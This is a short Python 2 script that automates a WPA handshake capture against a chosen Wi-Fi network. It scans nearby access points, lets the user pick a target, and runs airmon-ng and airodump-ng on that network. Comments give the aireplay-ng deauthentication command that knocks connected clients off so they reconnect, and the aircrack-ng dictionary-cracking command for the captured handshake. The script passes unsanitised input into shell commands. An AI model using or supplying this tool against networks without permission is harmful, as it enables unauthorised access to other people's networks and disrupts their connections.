#!/usr/bin/env python

import os

#After the handshake is caught run:
####################################################
#sudo aircrack-ng -w words.txt -b BSSID output*.cap#
####################################################

#Maybe use this to force a handshake
#aireplay-ng -0 #OFTIMES -a BSSID -c SOMEMACADDRESSCONNECTEDTOIT mon0

def getNetworks(device):
    getNetworksProcess = os.popen("sudo iwlist " + device + " scan | grep -E '(Channel:|Address:|ESSID:)'").read()
    
    rawNetworks = getNetworksProcess.splitlines()
    
    refinedNetworks = []
    
    for i in range(0, len(rawNetworks), 3):
        refinedNetworks.append((rawNetworks[i].strip()[len(rawNetworks[i].strip())-17:len(rawNetworks[i].strip())],     #Gets the MAC Address
                         rawNetworks[i+1].strip().strip('Channel:'),                                                    #Gets the channel
                         rawNetworks[i+2].strip().strip('ESSID:').strip("\"")                                           #Gets the ESSID
                         ))
    return refinedNetworks

def setNetworkInfo(networkList, target):
    for item in networkList:
        if(item[2] == target):
            global bssid
            bssid = item[0]
            global channel
            channel = item[1]
            global essid
            essid = item[2]
            
def setDeviceInfo(device):
    getDeviceInfoProcess = os.popen("ifconfig | grep " + device).read().split(' ')
    
    while '' in getDeviceInfoProcess:
        getDeviceInfoProcess.remove('')
    while '\n' in getDeviceInfoProcess:
        getDeviceInfoProcess.remove('\n')
    
    global mac
    mac = getDeviceInfoProcess[len(getDeviceInfoProcess) - 1]
    
def printInfo():
    global device
    global mac
    global bssid
    global channel
    global essid
    print "Device: " + device
    print "MAC: " + mac
    print "BSSID: " + bssid
    print "Channel: " + channel
    print "ESSID: " + essid 


os.system("sudo echo What device to use?")
device = raw_input()
mac = ''
bssid = ''
channel = ''
essid = ''

print "===================================="
networkList = getNetworks(device)
for item in networkList:
    print item[2]
print "===================================="


userinput = raw_input("Target ID?\n")
if (userinput != "exit"):
    setNetworkInfo(networkList, userinput)
    
    setDeviceInfo(device)
    
    printInfo()
    
    #os.system("sudo stop network-manager")
    #os.system("sudo ifconfig " + device + " down")
    os.system("sudo airmon-ng start " + device + " " + channel)
    os.system("sudo airodump-ng -c " + channel +" --bssid " + bssid +" -w output mon0 --ignore-negative-one")
    
    os.system("sudo airmon-ng stop mon0")
    os.system("sudo rm -f output*")
    #os.system("sudo start network-manager")